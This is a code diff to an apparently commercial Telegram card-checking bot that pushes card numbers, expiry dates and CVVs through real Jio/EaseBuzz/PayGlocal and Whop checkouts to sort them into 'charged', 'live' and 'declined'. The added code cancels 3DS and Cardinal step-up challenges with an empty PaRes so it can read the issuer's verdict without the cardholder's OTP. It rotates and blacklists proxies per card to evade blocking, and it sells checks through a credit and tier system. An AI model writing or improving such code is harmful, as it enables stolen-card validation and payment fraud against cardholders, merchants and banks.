+    """Abort a Cardinal 3DS step-up (empty PaRes) so the flow can be re-asked
+    for the real issuer verdict instead of stopping at "3D REQUIRED"."""
+    info = {"tried": False, "http": None, "error": ""}
+    url, tok = _ipay_stepup_form(ipay_json)
+    if not url:
+        return info
+    info["tried"] = True
+    try:
+        r = sess.post(
+            url,
+            headers={"Content-Type": "application/x-www-form-urlencoded",
+                     "User-Agent": headers.get("User-Agent", "Mozilla/5.0")},
+            data={"JWT": tok, "PaRes": "", "cancelled": "Y"},
+            timeout=timeout or JIO_TIMEOUT, allow_redirects=True)
+        info["http"] = getattr(r, "status_code", None)
+        info["body_len"] = len(getattr(r, "text", "") or "")
+    except Exception as e:
+        info["error"] = str(e)[:120]
+    return info
+
+
 def jio_hit(phone: str, amount: str, cc: str, mm: str, yy: str, cvv: str,
             proxy: str | None = None) -> dict:
     """Full Jio → EaseBuzz → PayGlocal checkout with proper status detection."""
@@ -23097,13 +24511,21 @@ def jio_hit(phone: str, amount: str, cc: str, mm: str, yy: str, cvv: str,
             headers={**bh, "Referer": recharge_ref},
             timeout=JIO_TIMEOUT,
         )
-        plan_key = _find_plan_key(r.json() if r.text.strip().startswith("{") else {}, amount)
+        _plans = r.json() if r.text.strip().startswith("{") else {}
+        _want = str(amount or "").strip().lower()
+        if _want in ("auto", "min", "smallest", "lowest", ""):
+            _amt, plan_key = _jio_smallest_plan(_plans)
+            if _amt:
+                amount = _amt
+        else:
+            plan_key = _find_plan_key(_plans, amount)
         print(f"✅ Step 2: Plan key found: {plan_key}")
     except Exception as e:
         result["error"] = f"Step 2: {e}"
         result["status"] = "ERROR"
         print(f"❌ Step 2 error: {e}")
         return result
+    result["amount_used"] = str(amount)
     if not plan_key:
         result["error"] = f"Plan ₹{amount} not found"
         result["status"] = "ERROR"
@@ -23409,7 +24831,12 @@ def jio_hit(phone: str, amount: str, cc: str, mm: str, yy: str, cvv: str,
         _txt = getattr(resp, "text", "") or ""
         for _pat in (r"x-gl-token=([A-Za-z0-9._%\-]+)",
                      r"x-gl-token%3D([A-Za-z0-9._%\-]+)",
-                     r'x-gl-token["\']?\s*[:=]\s*["\']?([A-Za-z0-9._%\-]+)'):
+                     r'x-gl-token["\']?\s*[:=]\s*["\']?([A-Za-z0-9._%\-]+)',
+                     # token embedded in JSON / encoded JSON / link attributes
+                     r'x-?gl-?token["\']?\s*[:=]\s*["\']([^"\'&<>]+)',
+                     r'xGlToken["\']?\s*[:=]\s*["\']([^"\'&<>]+)',
+                     r'x-gl-token%22%3A%22([^%\"&]+)',
+                     r'(?:src|href)=["\'][^"\']*x-gl-token(?:=|%3D)([^"\'&]+)'):
             _m = re.search(_pat, _txt)
             if _m:
                 return urllib.parse.unquote(_m.group(1))
@@ -23421,7 +24848,7 @@ def jio_hit(phone: str, amount: str, cc: str, mm: str, yy: str, cvv: str,
                   "Referer": "https://pay.jio.com/",
                   "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
     r_eb = eb_sess.post(eb_action, headers=eb_headers, data=eb_data,
-                        timeout=JIO_TIMEOUT, allow_redirects=False)
+                        timeout=JIO_TIMEOUT, allow_redirects=True)
 
     _loc = ""
     try:
@@ -23448,20 +24875,43 @@ def jio_hit(phone: str, amount: str, cc: str, mm: str, yy: str, cvv: str,
 
     if not gl_token:
         _raw = getattr(r_eb, "text", "") or ""
-        result["steps"]["easebuzz_raw"] = _raw[:800]
-        _low = _raw.lower()
-        if any(k in _low for k in ("otp", "one time password", "3d secure",
-                                   "3ds", "authentication", "verify")):
-            result["status"] = "3DS_REQUIRED"
-            result["message"] = "Bank OTP/3DS page returned — manual OTP required"
-            print("🔐 EaseBuzz returned an OTP/3DS page")
-        else:
-            result["status"] = "ERROR"
-            result["message"] = (f"x-gl-token not found (easebuzz "
-                                 f"http {getattr(r_eb, 'status_code', '?')})")
-            print("❌ x-gl-token not found")
-        result["elapsed"] = round(time.time() - t0, 2)
-        return result
+        _code = getattr(r_eb, "status_code", "?")
+        # Keep the whole page - the verdict is read from its CONTENT below,
+        # so truncating at 800 chars used to hide the OTP/card markers.
+        result["steps"]["easebuzz_raw"] = _raw[:4000]
+        result["steps"]["easebuzz_http"] = _code
+
+        # 3DS CHALLENGE → CANCEL IT, then keep going to the real response.
+        # An OTP page withholds the hand-back, so the merchant never returns
+        # a verdict. Cancelling the challenge (empty auth submit + the page's
+        # back-to-merchant link) produces the hand-back and therefore the
+        # token that unlocks paynow/ipay and the REAL issuer response.
+        if PGL_CANCEL_3DS:
+            _tok, _cinfo = _pgl_cancel_3ds_challenge(
+                eb_sess, r_eb, eb_headers, eb_action, eb_data,
+                token_finder=_gl_token_from)
+            result["steps"]["3ds_cancel"] = _cinfo
+            if _tok:
+                gl_token = _tok
+                print("✅ [JIO] 3DS challenge cancelled → x-gl-token obtained")
+            else:
+                print(f"↩️ [JIO] 3DS challenge not resolvable: {_cinfo.get('tried')}")
+
+        if not gl_token:
+            # Could not get past the challenge: report it truthfully.
+            _3ds = extract_3ds_response(ccdc_json, html_form)
+            result["steps"]["3ds"] = _3ds
+            result["steps"]["3ds_raw"] = _3ds.get("summary", "")
+            _status, _msg = classify_easebuzz_page(_raw, _code)
+            result["status"] = _status
+            result["message"] = _msg
+            if _status == "3DS_REQUIRED":
+                print(f"🔐 [JIO] EaseBuzz page → 3DS/OTP ({_msg})")
+            else:
+                print(f"❌ [JIO] EaseBuzz page → {_msg}")
+            result["elapsed"] = round(time.time() - t0, 2)
+            return result
+
     gid = _decode_jwt_payload(gl_token).get("x-gl-gid", "")
     print("✅ Step 9: x-gl-token obtained")
 
@@ -23672,29 +25122,40 @@ def jio_hit(phone: str, amount: str, cc: str, mm: str, yy: str, cvv: str,
 
     # ── Step 10g: iPayNow ────────────────────────────────────────────────────
     print("📡 Step 15: Finalizing payment...")
-    try:
-        r_ipay = pg_sess.post(
+
+    _ipay_body = {
+        "customerCurrency": "INR",
+        "cardinalRequest": {"messageType": "", "payload": ""},
+        "saveCurrencyPreference": False,
+        "browserDetails": {
+            "colorDepth": 24,
+            "javaEnabled": False,
+            "javaScripEnabled": True,
+            "language": "en-Us",
+            "screenHeight": 640,
+            "screenWidth": 480,
+            "timeZone": 330,
+        },
+        "reachData": {"fingerprintId": None},
+        "fallbackToInrCurrency": True,
+    }
+
+    def _post_ipay():
+        r = pg_sess.post(
             f"https://api.payglocal.com{ipay_path}",
             params={"x-gl-token": gl_token},
             headers=pg_api_h,
-            json={
-                "customerCurrency": "INR",
-                "cardinalRequest": {"messageType": "", "payload": ""},
-                "saveCurrencyPreference": False,
-                "browserDetails": {
-                    "colorDepth": 24,
-                    "javaEnabled": False,
-                    "javaScripEnabled": True,
-                    "language": "en-Us",
-                    "screenHeight": 640,
-                    "screenWidth": 480,
-                    "timeZone": 330,
-                },
-                "reachData": {"fingerprintId": None},
-                "fallbackToInrCurrency": True,
-            },
+            json=_ipay_body,
             timeout=JIO_TIMEOUT,
         )
+        try:
+            data = r.json() if r.text.strip().startswith("{") else {}
+        except Exception:
+            data = {}
+        return r, data
+
+    try:
+        r_ipay, ipay_json = _post_ipay()
     except Exception as e:
         print(f"⚠️ iPay request error: {e}")
         result["error"] = f"iPay request failed: {str(e)[:100]}"
@@ -23702,12 +25163,24 @@ def jio_hit(phone: str, amount: str, cc: str, mm: str, yy: str, cvv: str,
         result["elapsed"] = round(time.time() - t0, 2)
         return result
 
+    # 3DS STEP-UP → CANCEL IT, THEN ASK AGAIN FOR THE REAL VERDICT.
+    # Without this the flow stops at "3D REQUIRED" and the issuer's real
+    # answer is never read. Cancelling the step-up (empty PaRes) and
+    # re-posting ipay returns the actual authorisation result.
+    if PGL_CANCEL_3DS and _ipay_stepup_form(ipay_json)[0]:
+        print("🔐 [JIO] Cardinal step-up detected → cancelling 3DS...")
+        _sinfo = _pgl_cancel_cardinal_stepup(pg_sess, ipay_json, pg_api_h)
+        result["steps"]["stepup_cancel"] = _sinfo
+        try:
+            r_ipay, ipay_json = _post_ipay()
+            result["steps"]["ipay_after_cancel"] = ipay_json
+            print(f"✅ [JIO] ipay re-asked after 3DS cancel → "
+                  f"{str(ipay_json.get('status') or '?').upper()}")
+        except Exception as e:
+            print(f"⚠️ iPay re-ask after 3DS cancel failed: {e}")
+
     # ============ SAFELY PARSE IPAY JSON ============
-    ipay_json = {}
-    try:
-        if r_ipay.text and r_ipay.text.strip().startswith("{"):
-            ipay_json = r_ipay.json()
-    except json.JSONDecodeError:
+    if not isinstance(ipay_json, dict):
         ipay_json = {}
 
     result["steps"]["ipay"] = ipay_json
@@ -23782,6 +25255,58 @@ def jio_hit(phone: str, amount: str, cc: str, mm: str, yy: str, cvv: str,
 # Replace the format_jio_response function with this fixed version
 
 # ============ FIXED FORMAT_JIO_RESPONSE - DETECTS 3DS ============
+
+# ── PENDING / AUTHORIZED HELPERS ───────────────────────────────────────
+# A card can end up PENDING in three ways inside jio_hit():
+#   1. bank AUTHORIZED the amount but never captured it
+#   2. payment was captured but Jio's recharge confirmation failed
+#   3. no EaseBuzz 3DS form came back and nothing was captured
+# jio_hit() already stores a human reason in result["message"] for all three.
+# These helpers make sure that reason reaches the card instead of a bare
+# "PENDING" (which used to fall through the generic error branch).
+_PENDING_STATUSES = (
+    "PENDING", "PENDING_PAYMENT", "SETTLEMENT_PENDING", "CAPTURE_PENDING",
+    "AUTHORIZED", "AUTHORISED", "INPROGRESS", "IN_PROGRESS", "PROCESSING",
+)
+
+
+def _jio_pending_reason(status: str, message: str, detailed_msg: str = "",
+                        steps: dict = None) -> str:
+    """Human explanation for a PENDING/INPROGRESS Jio result.
+
+    Prefers the specific wording jio_hit() already recorded; only derives a
+    reason from the raw steps when that is empty or is just the status word.
+    """
+    def _meaningful(txt) -> str:
+        t = str(txt or "").strip()
+        if t.upper().strip(". -") in (
+                "", "PENDING", "PROCESSING", "INPROGRESS", "IN_PROGRESS",
+                "AUTHORIZED", "AUTHORISED", "UNKNOWN", "NONE", "NULL"):
+            return ""
+        return t
+
+    reason = _meaningful(message) or _meaningful(detailed_msg)
+
+    if not reason:
+        st = str(status or "").upper()
+        steps = steps or {}
+        ccdc = steps.get("ccdc") or {}
+        blob = json.dumps(ccdc, ensure_ascii=False, default=str).lower()
+        html_form = str(ccdc.get("htmlForm") or "")
+        if st in ("AUTHORIZED", "AUTHORISED"):
+            reason = "Bank authorized — capture pending"
+        elif any(k in blob for k in ("sent_for_capture", "captured",
+                                     "payment_success", "payment successful")):
+            reason = "Payment captured — Jio recharge not confirmed yet"
+        elif not html_form.strip():
+            reason = "No 3DS returned by Jio — payment not confirmed"
+        else:
+            reason = "Payment pending — not confirmed by Jio"
+
+    if len(reason) > 90:
+        reason = reason[:87] + "..."
+    return reason
+
 
 def format_jio_response(result: Dict, card: str, compact: bool = False) -> Tuple[str, str]:
     """
@@ -23858,13 +25383,31 @@ def format_jio_response(result: Dict, card: str, compact: bool = False) -> Tuple
     # ============ Determine status emoji and text ============
     
     # FIRST: Check for 3DS - this takes priority over INPROGRESS
+    # A definitive verdict must NOT be overwritten by a 3D REQUIRED label:
+    # - ERROR / CANCELLED: the flow never reached the bank
+    # - DECLINED / ISSUER_DECLINE / INSUFFICIENT_FUNDS: the issuer already
+    #   answered, a 3DS form in the htmlForm is just history
+    # Only an inconclusive status (INPROGRESS / unknown) really means 3DS.
     if has_3ds and status_lower not in (
             "SUCCESS", "SUCCEEDED", "COMPLETED", "CAPTURED", "CHARGED",
-            "SENT_FOR_CAPTURE"):
+            "SENT_FOR_CAPTURE", "ERROR", "CANCELLED", "CANCELED",
+            "DECLINED", "ISSUER_DECLINE", "GENERAL_DECLINE", "FAILED",
+            "INSUFFICIENT_FUNDS", "AUTHORIZED", "AUTHORISED",
+            "PENDING", "PENDING_PAYMENT", "SETTLEMENT_PENDING",
+            "CAPTURE_PENDING"):
         status_emoji = safe_premium_emoji("lock", "🔐")
         status_text = "3D REQUIRED"
         status_category = "approved"  # 3DS means the card is live/valid
         print(f"🔐 [JIO] Card requires 3DS authentication")
+
+    # FIRST-B: the flow itself decided 3DS/OTP is needed (e.g. EaseBuzz
+    #          returned an OTP page instead of an x-gl-token)
+    elif status_lower in ("3DS_REQUIRED", "3DSREQUIRED", "OTP_REQUIRED",
+                          "AUTHENTICATION_REQUIRED", "3DS"):
+        status_emoji = safe_premium_emoji("lock", "🔐")
+        status_text = "3D REQUIRED"
+        status_category = "approved"
+        print(f"🔐 [JIO] 3DS/OTP required (flow status)")
     
     # SECOND: Check for actual success
     elif status_lower in ["SUCCESS", "SUCCEEDED", "COMPLETED", "CAPTURED", "CHARGED"]:
@@ -23894,12 +25437,24 @@ def format_jio_response(result: Dict, card: str, compact: bool = False) -> Tuple
             status_text = detailed_msg[:60] if detailed_msg else "Declined"
             status_category = "declined"
     
-    # FIFTH: Check for INPROGRESS without 3DS (this shouldn't happen often)
-    elif status_lower == "INPROGRESS":
-        # If it's INPROGRESS but no 3DS, it might be a pending transaction
-        status_emoji = safe_premium_emoji("time", "⏳")
-        status_text = "Processing"
-        status_category = "processing"
+    # FOURTH-B: hard flow ERROR (nothing reached the bank, e.g. "x-gl-token
+    #           not found", proxy failure, missing form, ...). Show what the
+    #           flow recorded instead of a bare "ERROR" or a fake 3D verdict.
+    elif status_lower in ("ERROR", "CANCELLED", "CANCELED"):
+        status_emoji = safe_premium_emoji("warning", "⚠️")
+        status_text = (detailed_msg[:70] if detailed_msg
+                       else ("Cancelled" if "CANCEL" in status_lower
+                             else "Gateway error"))
+        status_category = "error"
+
+    # FIFTH: PENDING / AUTHORIZED / PROCESSING (no 3DS form to authenticate)
+    #        Never render a bare "PENDING" - show the real reason jio_hit()
+    #        recorded (authorized-but-not-captured, recharge not confirmed, ...).
+    elif status_lower in _PENDING_STATUSES:
+        status_emoji = safe_premium_emoji("pending", "⏳")
+        status_text = _jio_pending_reason(status, message, detailed_msg, steps)
+        status_category = "pending"
+        print(f"⏳ [JIO] PENDING → {status_text}")
     
     # SIXTH: Default fallback
     else:
@@ -23979,6 +25534,25 @@ def _jhit_is_retryable_error(result: dict) -> bool:
         "recv failure", "couldn't connect", "could not connect",
         "temporary failure", "reset by peer", "empty reply",
         "operation was aborted", "ssl", "failed to perform",
+    )
+    return any(n in err for n in needles)
+
+
+def _whop_is_retryable_error(result) -> bool:
+    """True when a failed Whop attempt is a NETWORK/Proxy error (worth
+    retrying on another proxy) rather than a real card verdict."""
+    if not isinstance(result, dict):
+        return False
+    if (result.get("status") or "").upper() not in ("ERROR", "UNKNOWN"):
+        return False
+    err = str(result.get("message") or result.get("error") or "").lower()
+    needles = (
+        "timed out", "timeout", "curl: (28)", "curl: (7)", "curl: (35)",
+        "curl: (56)", "curl: (52)", "connection", "connect", "proxy",
+        "recv failure", "couldn't connect", "could not connect",
+        "temporary failure", "reset by peer", "empty reply",
+        "operation was aborted", "ssl", "failed to perform",
+        "tunnel", "407", "no proxy", "network",
     )
     return any(n in err for n in needles)
 
@@ -24102,12 +25676,14 @@ async def jhit_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         print("\U0001f50c Global pool empty/disabled - direct connection")
 
     # ============ START PROCESSING CARDS ============
+    sc_clear_stop(user_id, "jhit")
     total_cards = len(cards)
     results = []
     success_card = None
     failed_cards = []
     charged_count = 0
     tried_cards = []  # Track cards already tried to prevent duplicates
+    cancelled = False  # user pressed the Cancel button
     
     diamond_emoji = premium_emoji(PREMIUM_EMOJI_IDS.get("diamond", "5427168083074628963"), "💎")
     skull_emoji = premium_emoji(PREMIUM_EMOJI_IDS.get("skull", "5042167377869932162"), "💀")
@@ -24141,6 +25717,13 @@ async def jhit_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         if card_display in tried_cards:
             print(f"⏭️ Skipping already tried card: {card_display[:20]}...")
             continue
+
+        # ============ USER PRESSED CANCEL ============
+        if sc_is_stopped(user_id, "jhit"):
+            cancelled = True
+            print(f"🛑 [jhit] cancelled by user {user_id} before card {idx}")
+            break
+
         tried_cards.append(card_display)
         
         print(f"\n{'='*60}")
@@ -24169,6 +25752,11 @@ async def jhit_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
             result = None
             for _ai, _attempt_proxy in enumerate(attempt_order):
+                # Cancel pressed while rotating proxies → stop this card here.
+                if sc_is_stopped(user_id, "jhit"):
+                    result = {"status": "CANCELLED", "message": "Cancelled by user"}
+                    cancelled = True
+                    break
                 result = await loop.run_in_executor(
                     thread_pool, jio_hit,
                     phone, amount, cc, mm, yy, cvv, _attempt_proxy
@@ -24199,6 +25787,16 @@ async def jhit_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
                         pass
                     await asyncio.sleep(1)
 
+            # ============ CANCELLED BY USER ============
+            if (result or {}).get("status") == "CANCELLED":
+                cancelled = True
+                print(f"🛑 [jhit] cancelled by user {user_id} on card {idx}")
+                break
+            if sc_is_stopped(user_id, "jhit"):
+                # the attempt had already finished — record its verdict, then stop
+                cancelled = True
+                print(f"🛑 [jhit] cancel after card {idx} finished")
+
             status = result.get("status") or "UNKNOWN"
             # `message` is initialised to "" and is never populated on error
             # paths, so fall back to the actual error (e.g. proxy timeout)
@@ -24213,7 +25811,9 @@ async def jhit_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await record_free_hit_usage(user_id, "jhit", update, context)
             
             is_charged = status.upper() in ["SUCCESS", "SUCCEEDED", "COMPLETED", "CAPTURED", "CHARGED"]
-            is_approved = status.upper() in ["APPROVED", "LIVE", "CVV_LIVE", "INSUFFICIENT_FUNDS"]
+            is_approved = status.upper() in ["APPROVED", "LIVE", "CVV_LIVE", "INSUFFICIENT_FUNDS",
+                                            "3DS_REQUIRED", "OTP_REQUIRED",
+                                            "AUTHENTICATION_REQUIRED"]
             
             result['card'] = card_display
             block, status_category = format_jio_response(result, card_display, compact=True)
@@ -24261,6 +25861,9 @@ async def jhit_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
             
             if idx < total_cards:
                 await asyncio.sleep(2)
+
+            if cancelled:
+                break
                 
         except Exception as e:
             error_msg = str(e)
@@ -24287,6 +25890,15 @@ async def jhit_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     charged_emoji = premium_emoji(PREMIUM_EMOJI_IDS.get("charged", "5039670412733055750"), "🔥")
     declined_emoji = premium_emoji(PREMIUM_EMOJI_IDS.get("declined", "6267039884016358504"), "❌")
+
+    # ============ CANCELLED: refund the cards that were never checked =====
+    if cancelled:
+        if tier == 'free':
+            _unchecked = max(0, total_cards - len(results))
+            if _unchecked:
+                add_user_credits(user_id, _unchecked)
+                print(f"🪙 [jhit] refunded {_unchecked} credit(s) after cancel")
+        progress_blocks.append("🛑 <b>Cancelled by you</b>")
     
     if success_card:
         summary = (
@@ -24300,11 +25912,13 @@ async def jhit_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
             f"{diamond_emoji} <b>Jio</b>\n\n"
             f"<b>Phone:</b> <code>{phone}</code>\n"
             f"<b>Amount:</b> ₹{amount}\n"
-            f"<b>Complete - No Success</b>"
+            f"<b>{'Cancelled' if cancelled else 'Complete - No Success'}</b>"
         )
     
     if progress_blocks:
         summary = summary + "\n\n" + "\n\n".join(progress_blocks)
+
+    # No action buttons on the summary — clean verdict only.
     await progress_msg.edit_text(summary, parse_mode=ParseMode.HTML)
     
     user_manager.increment_checks(user_id, len(results))
@@ -29425,7 +31039,6 @@ class UserManager:
                 "stc1",
                 "sc1",
                 "princess",
-                "payglocal",
                 "whop",
                 "stco",
                 "jhit",
@@ -81264,15 +82877,27 @@ async def whop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     progress_msg = None
 
     try:
-        # ── Optional proxy ─────────────────────────────────────────────
-        proxy_str = None
+        # ── Proxies: shared GLOBAL pool, rotated per card (same policy as /jhit)
+        #    1) proxy from the global pool (3 random, auth-only, dead skipped)
+        #    2) every card starts on the next proxy (round-robin)
+        #    3) network/CONNECT failure → blacklist that proxy, retry the SAME
+        #       card on the next one
+        #    4) after all proxies fail → final attempt is DIRECT (no proxy)
+        proxy_list = []
         if user_manager.can_use_proxy(user_id):
-            if (user_id in autosopi_proxy_tracker.working_proxies
-                    and autosopi_proxy_tracker.working_proxies[user_id]):
-                proxy_list = autosopi_proxy_tracker.working_proxies[user_id]
-                if proxy_list:
-                    proxy_str = proxy_list[0]
-                    print(f"🔌 [Whop] Using proxy: {mask_proxy(proxy_str)}")
+            try:
+                proxy_list = _ext_proxy_list(user_id, 3)
+            except Exception as e:
+                print(f"⚠️ [Whop] proxy list failed: {e}")
+                proxy_list = []
+
+        if proxy_list:
+            print(f"🔌 [Whop] Global pool: {len(proxy_list)} proxy(ies) → "
+                  + ", ".join(mask_proxy(_p) for _p in proxy_list))
+        else:
+            print("🔌 [Whop] no proxy available — direct connection")
+
+        proxy_str = proxy_list[0] if proxy_list else None
 
         total_cards = len(cards)
         amount_display = "…"
@@ -81331,15 +82956,65 @@ async def whop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
         # ── Process each card ──────────────────────────────────────────
         for idx, card in enumerate(cards, 1):
-            # ── Hit ────────────────────────────────────────────────────
-            try:
-                result = await whop_hit(checkout_url, card, proxy_str)
-            except Exception as e:
-                print(f"❌ [WHOP] whop_hit raised: {e}")
-                traceback.print_exc()
-                result = {"status": "ERROR",
-                          "message": str(e)[:100],
-                          "amount": 0}
+            # ── Hit (proxy rotation on network errors) ─────────────────
+            if proxy_list:
+                _off = (idx - 1) % len(proxy_list)
+                attempt_order = proxy_list[_off:] + proxy_list[:_off] + [None]
+            else:
+                attempt_order = [None]
+
+            result = None
+            for _ai, _attempt_proxy in enumerate(attempt_order):
+                try:
+                    result = await whop_hit(checkout_url, card, _attempt_proxy)
+                except Exception as e:
+                    print(f"❌ [WHOP] whop_hit raised: {e}")
+                    traceback.print_exc()
+                    result = {"status": "ERROR",
+                              "message": str(e)[:100],
+                              "amount": 0}
+
+                if asyncio.iscoroutine(result):
+                    result = await result
+
+                _retryable = _whop_is_retryable_error(result)
+                if _retryable and _attempt_proxy:
+                    _ext_mark_dead(_attempt_proxy)
+                    try:
+                        proxy_list.remove(_attempt_proxy)
+                    except ValueError:
+                        pass
+                    print(f"🚫 [Whop] proxy blacklisted: {mask_proxy(_attempt_proxy)}")
+
+                    if _ai < len(attempt_order) - 1:
+                        _next = attempt_order[_ai + 1]
+                        _label = ("direct (no proxy)" if _next is None
+                                  else mask_proxy(_next))
+                        print(f"🔁 Card {idx} network error → retry on {_label}")
+                        try:
+                            await progress_msg.edit_text(
+                                _render(idx - 1, hitting=True)
+                                + f"\n\n🔁 <b>Retry {_ai + 2}:</b> {_label}",
+                                parse_mode=ParseMode.HTML)
+                        except Exception:
+                            pass
+                        await asyncio.sleep(0.8)
+                        continue
+
+                if _attempt_proxy and not _retryable:
+                    _EXT_GOOD_PROXY[user_id] = _attempt_proxy
+                    proxy_str = _attempt_proxy
+                break
+
+            # Every proxy (and the direct attempt) failed on the network →
+            # do NOT report the card as declined: it was never checked.
+            if _whop_is_retryable_error(result):
+                result = {
+                    "status": "ERROR",
+                    "message": ("Network/proxy error — card was NOT checked "
+                                "(all proxies failed, direct attempt failed too)"),
+                    "amount": result.get("amount", 0) if isinstance(result, dict) else 0,
+                }
 
             if asyncio.iscoroutine(result):
                 try:
@@ -88023,6 +89698,159 @@ def reset_user_credits(user_id: int) -> bool:
 load_user_credits()
 
 
+# ═══════════════════════════════════════════════════════════════════════════
+#  DAILY BONUS — free users get +20 credits every 24 hours
+#  Stored on the user record as `last_daily_bonus` (unix ts), so it survives
+#  restarts and needs no extra file. Paid tiers are skipped (unlimited).
+# ═══════════════════════════════════════════════════════════════════════════
+
+DAILY_BONUS_ENABLED  = True
+DAILY_BONUS_CREDITS  = 20      # credits granted per claim
+DAILY_BONUS_INTERVAL = 86400   # 24 hours
+
+_PAID_TIERS = ("premium", "ultimate", "admin")
+
+
+def daily_bonus_remaining(user_id: int) -> float:
+    """Seconds until this user's next bonus (0 when it can be claimed now)."""
+    try:
+        user = user_manager.get_user(user_id)
+        last = float(user.get("last_daily_bonus", 0) or 0)
+    except Exception:
+        return 0.0
+    if not last:
+        return 0.0
+    left = DAILY_BONUS_INTERVAL - (time.time() - last)
+    return left if left > 0 else 0.0
+
+
+def claim_daily_bonus(user_id: int):
+    """Grant the daily credits if due.
+
+    Returns (granted, seconds_until_next):
+        (20, 86400.0)  -> granted now
+        (0,  3600.0)   -> already claimed, wait 1h
+        (0,  0.0)      -> not eligible (paid tier / disabled)
+    """
+    if not DAILY_BONUS_ENABLED:
+        return 0, 0.0
+    try:
+        user = user_manager.get_user(user_id)
+    except Exception:
+        return 0, 0.0
+
+    if user.get("tier") in _PAID_TIERS:
+        return 0, 0.0
+
+    now = time.time()
+    last = float(user.get("last_daily_bonus", 0) or 0)
+    if last:
+        elapsed = now - last
+        if elapsed < DAILY_BONUS_INTERVAL:
+            return 0, DAILY_BONUS_INTERVAL - elapsed
+
+    try:
+        new_total = add_user_credits(user_id, DAILY_BONUS_CREDITS)
+    except Exception as e:
+        print(f"⚠️ [DAILY] credit grant failed for {user_id}: {e}")
+        return 0, 0.0
+
+    user["last_daily_bonus"] = now
+    user["daily_bonus_total"] = int(user.get("daily_bonus_total", 0) or 0) + DAILY_BONUS_CREDITS
+    user_manager.save_users()
+    print(f"🎁 [DAILY] user {user_id} +{DAILY_BONUS_CREDITS} credits "
+          f"(balance {new_total})")
+    return DAILY_BONUS_CREDITS, float(DAILY_BONUS_INTERVAL)
+
+
+def auto_daily_bonus(user_id: int) -> int:
+    """Silent helper for command paths: grant if due, return amount granted."""
+    try:
+        granted, _ = claim_daily_bonus(user_id)
+        return granted
+    except Exception:
+        return 0
+
+
+async def daily_bonus_worker(context: ContextTypes.DEFAULT_TYPE):
+    """Background job: top up every eligible free user every 24h."""
+    if not DAILY_BONUS_ENABLED:
+        return
+    try:
+        snapshot = list(user_manager.users.items())
+    except Exception as e:
+        print(f"⚠️ [DAILY] user snapshot failed: {e}")
+        return
+
+    now = time.time()
+    granted = 0
+    for uid_str, data in snapshot:
+        try:
+            if data.get("tier") in _PAID_TIERS:
+                continue
+            last = float(data.get("last_daily_bonus", 0) or 0)
+            if last and (now - last) < DAILY_BONUS_INTERVAL:
+                continue
+            uid = int(uid_str)
+        except (TypeError, ValueError):
+            continue
+        except Exception:
+            continue
+
+        try:
+            add_user_credits(uid, DAILY_BONUS_CREDITS)
+            data["last_daily_bonus"] = now
+            data["daily_bonus_total"] = int(data.get("daily_bonus_total", 0) or 0) + DAILY_BONUS_CREDITS
+            granted += 1
+        except Exception as e:
+            print(f"⚠️ [DAILY] grant failed for {uid}: {e}")
+
+    if granted:
+        user_manager.save_users()
+        print(f"🎁 [DAILY BONUS] +{DAILY_BONUS_CREDITS} credits -> {granted} user(s)")
+
+
+async def daily_bonus_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """/daily — claim the 24h free-credit bonus (or show when it is ready)."""
+    user = update.effective_user
+    message = update.effective_message
+    if not user or not message:
+        return
+
+    uid = user.id
+    tier = user_manager.get_tier(uid)
+
+    if tier in _PAID_TIERS:
+        await message.reply_text(
+            "💎 <b>Daily Bonus</b>\n\n"
+            f"Your <b>{tier.upper()}</b> plan already gives unlimited credits — "
+            "no daily bonus needed.",
+            parse_mode=ParseMode.HTML)
+        return
+
+    granted, next_in = claim_daily_bonus(uid)
+    balance = get_user_credits(uid)
+
+    if granted:
+        await message.reply_text(
+            "🎁 <b>Daily Bonus Claimed!</b>\n\n"
+            f"➕ <b>+{granted} credits</b>\n"
+            f"💰 <b>Balance:</b> <b>{balance}</b>\n"
+            f"⏱️ Next bonus in <b>24h</b>",
+            parse_mode=ParseMode.HTML)
+        return
+
+    hours = int(next_in // 3600)
+    mins = int((next_in % 3600) // 60)
+    await message.reply_text(
+        "🎁 <b>Daily Bonus</b>\n\n"
+        f"⏳ Next bonus in <b>{hours}h {mins}m</b>\n"
+        f"💰 <b>Balance:</b> <b>{balance}</b>\n\n"
+        f"Every free user gets <b>+{DAILY_BONUS_CREDITS} credits</b> every 24 hours.",
+        parse_mode=ParseMode.HTML)
+
+
+
 # ============ CREDIT CHECK FUNCTIONS ============
 
 # ═══════════════════════════════════════════════════════════════════════════
@@ -88108,6 +89936,13 @@ async def check_and_deduct_credits(
     #  4. FREE TIER — must have enough credits
     # ═════════════════════════════════════════════════════════════════
 
+    # Daily +20 (24h) — applied here too so a user never has to wait for
+    # the background job to fire.
+    try:
+        auto_daily_bonus(user_id)
+    except Exception:
+        pass
+
     # Ensure the user has a credit record (new users get the starting balance)
     credits = get_user_credits(user_id)
     if credits == 0 and user_id not in user_credits:
@@ -88125,6 +89960,8 @@ async def check_and_deduct_credits(
             f"(1 credit per card)\n"
             f"━━━━━━━━━━━━━━━━━━━\n\n"
             f"💎 <b>Ways to get more credits:</b>\n"
+            f"├─ Free daily bonus: <code>/daily</code> "
+            f"(+{DAILY_BONUS_CREDITS} every 24h)\n"
             f"├─ Redeem a credit key: "
             f"<code>/redeemcredits &lt;key&gt;</code>\n"
             f"├─ Upgrade to unlimited\n"
@@ -93031,6 +94868,8 @@ def main():
     # ============ CREDIT SYSTEM COMMANDS ============
     app.add_handler(CommandHandler("credits", credits_command))
     app.add_handler(CommandHandler("redeemcredits", redeem_credits_command))
+    app.add_handler(CommandHandler("daily", daily_bonus_command))
+    app.add_handler(CommandHandler("bonus", daily_bonus_command))
     app.add_handler(CommandHandler("gencreditkey", gencreditkey_command))
     app.add_handler(CommandHandler("bulkgencredit", bulkgencredit_command))
     app.add_handler(CommandHandler("listcreditkeys", listcreditkeys_command))
@@ -93164,6 +95003,9 @@ def main():
     
     # ============ JIO COMMANDS ============
